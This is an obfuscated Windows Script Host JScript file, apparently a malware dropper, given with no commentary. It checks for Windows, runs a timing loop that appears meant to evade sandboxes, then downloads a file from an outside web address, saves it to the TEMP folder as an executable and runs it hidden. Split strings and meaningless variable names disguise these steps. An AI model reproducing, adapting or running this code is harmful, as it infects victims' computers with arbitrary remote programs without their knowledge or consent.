var Om = false;
var r = "CreateObject";
var KG = function Md() {return WScript[r]("WScript.Shell");}(), a = 11;
var f = "MSXML2.XMLHTTP";
var MS = 2123213;
var ix = 0;
function o(Xq){KG["Run"](Xq, ix, ix);};
function I(){return "" + f;};
function l0(Gf, K){ix = ix * 1; return Gf - K;};
function zM(){return r;};
/*@cc_on
  @if (@_win32 || @_win64)
    Om = true;
  @end
@*/
if (Om)
{
var V = "";
function F(){return 22;};
var tC = 0; var TZ = 0;
function wT()
{
var H0 = new this["Date"]();
var Px = H0["getUTCMilliseconds"]();
WScript["Sleep"](F());
var H0 = new this["Date"]();
var Cp = H0["getUTCMilliseconds"]();
WScript["Sleep"](F());
var H0 = new this["Date"]();
var T = H0["getUTCMilliseconds"]();
var tC = "Iv";
tC = l0(Cp, Px);
var TZ = "PL";
TZ = l0(T, Cp);
V = "open";
return l0(tC, TZ);
}
var sU = false;
var Q = false;
for (var we = ix; we < F() * 1; we++){if (wT() != ix){
sU = true; 
TZ = "31" + 11 * tC + TZ; 
Q = true; 
break;
}}
function l() {return ((sU == true) && (sU == Q)) ? 1 : ix;};
if (sU && l() && Q){
function X() {return KG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Dx9z1bia.exe";};
 Na = I();
 Sb = WScript[r](Na);
 var fw = 1;
 while (fw){
try {
Sb[V]("GET", "http://www.deco-dessert.com/k3dua", false);
Sb["send"]();
P = "Sleep";
for (;;){WScript[P](F() * 11); if (Sb["readystate"] >= 2 * 2) break;};
fw = ix;
} catch(WD){};
}
function H(wy) {var KK = (1, 2, 3, 4, 5, wy); return KK;};
U = WScript[zM()]("ADODB.Stream");
Na = U;
Na[V]();
Na["type"] = H(1);
Na["write"](Sb["ResponseBody"]);
U["position"] = H(ix);
Na["Save" + "ToFile"](X(), 2);
U["c"+"lose"]();
sF = X();
o(sF);
}
}

